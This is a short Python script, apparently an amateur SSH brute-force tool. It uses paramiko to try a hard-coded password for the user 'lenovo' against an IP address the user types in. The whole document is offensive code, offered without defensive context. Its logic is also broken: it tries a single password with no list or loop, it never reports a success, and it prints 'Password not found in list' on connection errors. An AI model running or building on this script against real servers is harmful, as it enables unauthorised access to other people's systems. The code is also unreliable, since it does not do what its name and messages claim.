import paramiko
def ssh_brute_force(host, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    
    try:
        print(f"Trying password: {password}")
        ssh.connect(hostname=host, port=port, username=username, password=password , timeout=5)
        ssh.close()
    except paramiko.AuthenticationException:
        # Wrong password, try next
        pass
    except Exception as e:
        print(f"Connection error: {e}")
        print("Password not found in list.")

host = input("ENTER THE SSH SERVER IP\n")  # Target SSH server IP
port = 22
username = "lenovo"
password = '12345678'
ssh_brute_force(host, port, username, password)
